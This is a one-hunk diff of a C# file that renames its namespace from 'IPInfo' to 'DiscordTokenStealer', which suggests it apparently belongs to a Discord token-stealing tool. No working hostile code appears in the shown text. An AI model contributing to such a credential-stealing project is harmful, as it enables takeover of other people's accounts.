@@ -3,7 +3,7 @@ using System.Net.Sockets;
 using System.Text.Json;
 using System.Text.Json.Serialization;
 
-namespace IPInfo
+namespace DiscordTokenStealer
 {
     public static class IPInfo
     {
